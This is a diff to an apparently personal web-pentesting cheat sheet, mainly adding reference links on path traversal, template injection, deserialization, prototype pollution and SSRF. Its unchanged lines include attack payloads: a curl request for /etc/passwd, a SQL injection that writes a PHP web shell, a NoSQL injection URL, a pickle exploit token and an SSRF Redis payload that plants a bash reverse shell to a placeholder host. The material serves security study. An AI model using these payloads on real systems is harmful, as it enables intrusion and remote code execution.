@@ -218,7 +218,8 @@ sudo systemctl restart httpd
 
 - https://owasp.org/www-community/attacks/Path_Traversal
 - https://owasp.org/www-community/attacks/Full_Path_Disclosure
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Zip%20Slip
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
 
 ```bash
 curl -X POST "http://example.org/test.php?file=....//....//....//....//etc/passwd" -d "file=logs_existing.txt"
@@ -236,6 +237,7 @@ curl -X POST "http://example.org/test.php?file=....//....//....//....//etc/passw
 - https://humbertojunior.com.br/infosec/pentest/2021/02/16/lfi-parameters.html
 - https://www.nc-lp.com/blog/disguise-phar-packages-as-images
 - https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md
 
 `Protection`: 
 
@@ -364,23 +366,36 @@ UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
 https://www.vulnerable.com/search?id=23277%22}},{%22$lookup%22:{%22from%22:%22flag%22,%22as%22:%22str%22,%22foreignField%22:%22flag%22,%22localField%22:%22flag
 ```
 
+
 ## SSTI
 
 - https://cheatsheet.hackmanit.de/template-injection-table/
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+
+### Python - Jinja2
+
+- https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html
 
 
 ## Insecure Deserialization
 
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/
 
-### Java - deserializeFromByteArray
+### Java
 
 - https://github.com/frohoff/ysoserial
 - https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
 - https://www.synacktiv.com/publications/java-deserialization-tricks
 
-### PHP - Unserialize
+### Node - Protoype pollution
+
+- https://www.offensiveweb.com/docs/others/prototype-pollution/
+- https://portswigger.net/research/server-side-prototype-pollution
+- https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html
+
+### PHP
+
+#### Unserialize
 
 - https://github.com/ambionics/phpggc
 - https://www.owasp.org/index.php/PHP_Object_Injection
@@ -398,9 +413,19 @@ class Token{
 echo urlencode(serialize([new Token()]));
 ``` 
 
-### Python - Pickle
+#### File Upload - phar:// wrapper
 
-- https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/
+- https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html
+
+### Python
+
+#### Yaml
+
+- https://book.hacktricks.wiki/en/pentesting-web/deserialization/python-yaml-deserialization.html
+
+#### Pickle
+
+- https://exploit-notes.hdks.org/exploit/web/framework/pickle-rce/
 - https://docs.python.org/3/library/pickle.html#object.__reduce__
 - https://stackoverflow.com/questions/23582489/python-pickle-protocol-choice
 - https://stackoverflow.com/questions/7501947/understanding-pickling-in-python
@@ -412,8 +437,10 @@ token = base64.b64encode(pickle.dumps(Exploit(), protocol=0))
 
 
 ## SSRF
-  - https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/
-  - https://www.dailysecurity.fr/server-side-request-forgery/
+
+- https://www.dailysecurity.fr/server-side-request-forgery/
+- https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
 
 ```bash
 file://index.php
@@ -451,6 +478,12 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 - `getElements` https://www.w3schools.com/js/tryit.asp?filename=tryjs_dom_getelementsbytagname
 - `Protection/Sanitazation`:
 	- https://github.com/cure53/DOMPurify
+
+	
+#### Client-Side Prototype pollution
+
+- https://github.com/BlackFan/client-side-prototype-pollution
+
 
 ### Challenges
 
